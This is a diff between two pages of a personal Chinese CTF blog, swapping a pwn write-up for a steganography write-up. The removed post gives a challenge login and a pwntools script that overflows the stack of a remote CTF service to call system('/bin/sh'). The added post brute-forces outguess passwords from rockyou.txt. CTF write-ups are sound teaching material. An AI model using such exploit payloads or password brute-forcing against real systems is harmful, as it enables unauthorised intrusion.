@@ -15,17 +15,17 @@
 
 
 
-<meta name="description" content="有system函数 无/bin/sh字符串 首先要求输入账号密码，查找字符串，账号为admin，密码为T6OBSh2i,之后进入menu函数，choice的输入有栈溢出，可以被利用，选择1之后可以对cmd字符串修改，给system提供参数/bin/sh。 因此大致就是首先输入账号密码，然后选择1，修改完system参数后返回menu函数，然后利用输入把menu的返回值覆盖为system函数的地址，">
+<meta name="description" content="记录一下记录一下。 HGAME2019WEEK3的misc1。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="十一欢乐赛-pwn4">
-<meta property="og:url" content="http://yoursite.com/2018/10/03/十一欢乐赛-pwn4/index.html">
+<meta property="og:title" content="outguess">
+<meta property="og:url" content="http://yoursite.com/2019/02/10/outguess/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="有system函数 无/bin/sh字符串 首先要求输入账号密码，查找字符串，账号为admin，密码为T6OBSh2i,之后进入menu函数，choice的输入有栈溢出，可以被利用，选择1之后可以对cmd字符串修改，给system提供参数/bin/sh。 因此大致就是首先输入账号密码，然后选择1，修改完system参数后返回menu函数，然后利用输入把menu的返回值覆盖为system函数的地址，">
+<meta property="og:description" content="记录一下记录一下。 HGAME2019WEEK3的misc1。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-10-03T09:54:31.371Z">
+<meta property="og:updated_time" content="2019-02-12T16:03:53.466Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="十一欢乐赛-pwn4">
-<meta name="twitter:description" content="有system函数 无/bin/sh字符串 首先要求输入账号密码，查找字符串，账号为admin，密码为T6OBSh2i,之后进入menu函数，choice的输入有栈溢出，可以被利用，选择1之后可以对cmd字符串修改，给system提供参数/bin/sh。 因此大致就是首先输入账号密码，然后选择1，修改完system参数后返回menu函数，然后利用输入把menu的返回值覆盖为system函数的地址，">
+<meta name="twitter:title" content="outguess">
+<meta name="twitter:description" content="记录一下记录一下。 HGAME2019WEEK3的misc1。">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -57,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>十一欢乐赛-pwn4 | 4eriri&#39;s blog</title>
+<title>outguess | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -189,11 +189,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-十一欢乐赛-pwn4" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-outguess" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/10/03/十一欢乐赛-pwn4/" class="article-date">
-      <time datetime="2018-10-03T09:19:05.000Z" itemprop="datePublished">2018-10-03</time>
+      <a href="/2019/02/10/outguess/" class="article-date">
+      <time datetime="2019-02-10T09:53:55.000Z" itemprop="datePublished">2019-02-10</time>
 </a>
 
 
@@ -208,7 +208,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      十一欢乐赛-pwn4
+      outguess
     </h1>
   
 
@@ -225,12 +225,19 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>有system函数 无/bin/sh字符串</p>
-<p>首先要求输入账号密码，查找字符串，账号为admin，密码为T6OBSh2i,<br>之后进入menu函数，choice的输入有栈溢出，可以被利用，选择1之后可以对cmd字符串修改，给system提供参数/bin/sh。</p>
-<p>因此大致就是首先输入账号密码，然后选择1，修改完system参数后返回menu函数，然后利用输入把menu的返回值覆盖为system函数的地址，最后选择3，退出menu函数，进入system函数，执行/bin/sh。</p>
-<p>脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;47.100.40.190&quot;,10009)</span><br><span class="line">sh.recvuntil(&apos;username: &apos;)</span><br><span class="line">sh.sendline(&apos;admin&apos;)</span><br><span class="line">sh.recvuntil(&apos;password: &apos;)</span><br><span class="line">sh.sendline(&apos;T6OBSh2i&apos;)</span><br><span class="line">sh.recvuntil(&apos;Your choice: &apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Command: &apos;)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.recvuntil(&apos;Your choice: &apos;)</span><br><span class="line">payload=&apos;a&apos;*0x50+&apos;a&apos;*8+p64(0x40084a)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&apos;Your choice: &apos;)</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>随后cat flag即可得到flag</p>
+        <p>记录一下记录一下。</p>
+<p>HGAME2019WEEK3的misc1。</p>
+<a id="more"></a>
+<p>题目文件为一个mp4，下载下来看了一遍就GG了。</p>
+<p>之后题目给了hint：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hint1:DeEgger Embedder</span><br><span class="line">hint2:outguess</span><br></pre></td></tr></table></figure>
+<p>直接对着上网去搜就行了，首先使用DeEgger Embedder把视频提取一下，得到一个exe文件，查看hex发现应该是jpg文件，改好后缀后就该用outguess了。</p>
+<p>outguess使用方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k key -r xxx.jpg xxx.txt</span><br></pre></td></tr></table></figure>
+<p>但是这里密码是需要自己来爆破的，题目提示了是kali里的rockyou.txt里的密码，虽然我没装kali但是网上也可以找到这个文件，写个脚本把符合要求的密码全部写到另一个文件里，然后开始爆破。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">f=open(&quot;sec.txt&quot;,&apos;rb&apos;) </span><br><span class="line">line=f.readline()</span><br><span class="line">i=1</span><br><span class="line">while line:</span><br><span class="line">	command=&quot;outguess -k &quot;+line.replace(&quot;\n&quot;,&quot;&quot;)+&quot; -r /Users/4eriri/Downloads/flag.jpg /Users/4eriri/Downloads/&quot;+str(i)+&quot;.txt&quot;</span><br><span class="line">	os.system(command)</span><br><span class="line">	line=f.readline()</span><br><span class="line">	i+=1</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+<p>这样每次爆破得到的文件就会以次数命名保存下来，然后按文件大小排序一下，那些几十个字节大小的txt就很有可能是正确密码爆破得到的。</p>
+<p>最后在206.txt中发现了flag，正确的key是<code>securitypassword</code>。</p>
 
       
     </div>
@@ -239,13 +246,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/10/03/十一欢乐赛-pwn4/">十一欢乐赛-pwn4</a></p>
+        <p><span>本文标题:</span><a href="/2019/02/10/outguess/">outguess</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2018-10-03, 17:19:05</p>
-        <p><span>最后更新:</span>2018-10-03, 17:54:31</p>
+        <p><span>发布时间:</span>2019-02-10, 17:53:55</p>
+        <p><span>最后更新:</span>2019-02-13, 00:03:53</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/10/03/十一欢乐赛-pwn4/" title="十一欢乐赛-pwn4">http://yoursite.com/2018/10/03/十一欢乐赛-pwn4/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/10/03/十一欢乐赛-pwn4/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/02/10/outguess/" title="outguess">http://yoursite.com/2019/02/10/outguess/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/02/10/outguess/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -258,15 +265,15 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/10/03/cgctf-stackoverflow/">
-                    cgctf-stackoverflow
+                <a href="/2019/02/12/HGAME2019-Say-Muggle-Code-a-k-a-SMC/">
+                    HGAME2019-Say-Muggle-Code a.k.a. SMC
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/10/03/十一欢乐赛-bss-stack/">
-                    十一欢乐赛-bss_stack
+                <a href="/2019/02/08/Math简单/">
+                    HGAME2019-Math简单
                 </a>
             </div>
         
@@ -314,7 +321,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"十一欢乐赛-pwn4　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"outguess　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -334,7 +341,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/10/03/cgctf-stackoverflow/" title="上一篇: cgctf-stackoverflow">
+            <a href="/2019/02/12/HGAME2019-Say-Muggle-Code-a-k-a-SMC/" title="上一篇: HGAME2019-Say-Muggle-Code a.k.a. SMC">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -342,7 +349,7 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/10/03/十一欢乐赛-bss-stack/" title="下一篇: 十一欢乐赛-bss_stack">
+            <a href="/2019/02/08/Math简单/" title="下一篇: HGAME2019-Math简单">
                 <i class="fa fa-angle-right"></i>
             </a>
         
